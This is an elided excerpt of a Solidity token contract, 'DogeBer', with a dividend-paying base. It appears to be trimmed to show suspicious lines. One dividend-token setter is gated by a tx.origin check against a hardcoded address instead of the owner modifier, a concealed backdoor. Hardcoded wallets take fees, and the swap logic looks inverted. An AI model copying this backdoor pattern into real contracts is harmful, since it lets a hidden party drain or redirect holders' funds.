...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xbdf91D291182f3E6e34b3bE5149bB1C16A4D8321, "Only owner");
...
contract DogeBer is ERC20, Ownable {
    ...
    address public rewardToken = address(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7); // BUSD
    ...
    address payable public reserveWallet = payable(0xa748E2b1a0F24D812f23E8ECb1D35e970926885d);
    ...
    uint256 private reserveSellFee = 3;
    ...
    function updateReserveWallet(address payable newAddress)
        public
        onlyOwner
    {
    ...
    function swapAndSendDividends(uint256 tokens) private {
       ...
       if(tokens <= 0){
        ...
        beforeSwap = IERC20(rewardToken).balanceOf(address(this));
        swapTokensForDividendToken(tokens);
        afterSwapDelta = IERC20(rewardToken).balanceOf(address(this)) - beforeSwap;
        countRewardsFee -= tokens;
        uint256 dividends = afterSwapDelta;
